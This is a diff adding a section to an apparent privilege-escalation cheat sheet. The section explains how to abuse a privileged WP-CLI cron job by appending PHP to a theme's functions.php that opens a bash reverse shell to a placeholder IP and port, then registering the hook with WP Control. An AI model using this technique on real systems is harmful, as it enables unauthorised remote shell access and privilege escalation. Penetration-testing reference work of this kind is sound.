@@ -293,6 +293,27 @@ cat /etc/cron.deny*
 
 You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.
 
+If a privileged user has established a Cron job for a WP Cron using WP CLI and the lower user has complete control over the content of WordPress, it is possible to abuse this to escalate the privilege.
+
+The steps:
+
+1) Install a Wordpress Plugin for maintaining a WP Cron such as WP Control
+2) Locate the file `functions.php` on the template file, typically found at `/wp-content/themes/{theme_name}/functions.php`
+3) Add the following code to the end of the `functions.php` file
+
+```php
+function wp_cron_pe_function() {
+    shell_exec('sh -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1');
+}
+add_action( 'wp_cron_pe', 'wp_cron_pe_function' );
+```
+
+Note: The reverse shell command can be customized as desired.
+
+4) Access the WP Control from WP Admin > Tools menu.
+5) Add a new Cron Event, add `wp_cron_pe` as a Hook Name
+6) Waiting Cron to be triggered
+
 ```powershell
 # print both commands and file system events and scan procfs every 1000 ms (=1sec)
 ./pspy64 -pf -i 1000 
